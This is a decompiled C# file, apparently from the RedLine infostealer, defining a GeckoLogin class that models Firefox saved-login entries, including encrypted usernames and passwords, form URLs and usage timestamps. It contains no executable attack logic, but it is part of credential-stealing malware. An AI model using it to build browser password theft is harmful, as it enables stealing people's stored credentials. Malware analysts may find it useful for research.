using System;

namespace RedLine.Models.Gecko
{
	// Token: 0x02000036 RID: 54
	public class GeckoLogin
	{
		// Token: 0x1700007E RID: 126
		// (get) Token: 0x0600014B RID: 331 RVA: 0x000047A4 File Offset: 0x000029A4
		// (set) Token: 0x0600014C RID: 332 RVA: 0x000047AC File Offset: 0x000029AC
		public int id { get; set; }

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x0600014D RID: 333 RVA: 0x000047B5 File Offset: 0x000029B5
		// (set) Token: 0x0600014E RID: 334 RVA: 0x000047BD File Offset: 0x000029BD
		public string hostname { get; set; }

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x0600014F RID: 335 RVA: 0x000047C6 File Offset: 0x000029C6
		// (set) Token: 0x06000150 RID: 336 RVA: 0x000047CE File Offset: 0x000029CE
		public object httpRealm { get; set; }

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x06000151 RID: 337 RVA: 0x000047D7 File Offset: 0x000029D7
		// (set) Token: 0x06000152 RID: 338 RVA: 0x000047DF File Offset: 0x000029DF
		public string formSubmitURL { get; set; }

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x06000153 RID: 339 RVA: 0x000047E8 File Offset: 0x000029E8
		// (set) Token: 0x06000154 RID: 340 RVA: 0x000047F0 File Offset: 0x000029F0
		public string usernameField { get; set; }

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000155 RID: 341 RVA: 0x000047F9 File Offset: 0x000029F9
		// (set) Token: 0x06000156 RID: 342 RVA: 0x00004801 File Offset: 0x00002A01
		public string passwordField { get; set; }

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000157 RID: 343 RVA: 0x0000480A File Offset: 0x00002A0A
		// (set) Token: 0x06000158 RID: 344 RVA: 0x00004812 File Offset: 0x00002A12
		public string encryptedUsername { get; set; }

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000159 RID: 345 RVA: 0x0000481B File Offset: 0x00002A1B
		// (set) Token: 0x0600015A RID: 346 RVA: 0x00004823 File Offset: 0x00002A23
		public string encryptedPassword { get; set; }

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x0600015B RID: 347 RVA: 0x0000482C File Offset: 0x00002A2C
		// (set) Token: 0x0600015C RID: 348 RVA: 0x00004834 File Offset: 0x00002A34
		public string guid { get; set; }

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x0600015D RID: 349 RVA: 0x0000483D File Offset: 0x00002A3D
		// (set) Token: 0x0600015E RID: 350 RVA: 0x00004845 File Offset: 0x00002A45
		public int encType { get; set; }

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x0600015F RID: 351 RVA: 0x0000484E File Offset: 0x00002A4E
		// (set) Token: 0x06000160 RID: 352 RVA: 0x00004856 File Offset: 0x00002A56
		public long timeCreated { get; set; }

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x06000161 RID: 353 RVA: 0x0000485F File Offset: 0x00002A5F
		// (set) Token: 0x06000162 RID: 354 RVA: 0x00004867 File Offset: 0x00002A67
		public long timeLastUsed { get; set; }

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x06000163 RID: 355 RVA: 0x00004870 File Offset: 0x00002A70
		// (set) Token: 0x06000164 RID: 356 RVA: 0x00004878 File Offset: 0x00002A78
		public long timePasswordChanged { get; set; }

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x06000165 RID: 357 RVA: 0x00004881 File Offset: 0x00002A81
		// (set) Token: 0x06000166 RID: 358 RVA: 0x00004889 File Offset: 0x00002A89
		public int timesUsed { get; set; }
	}
}
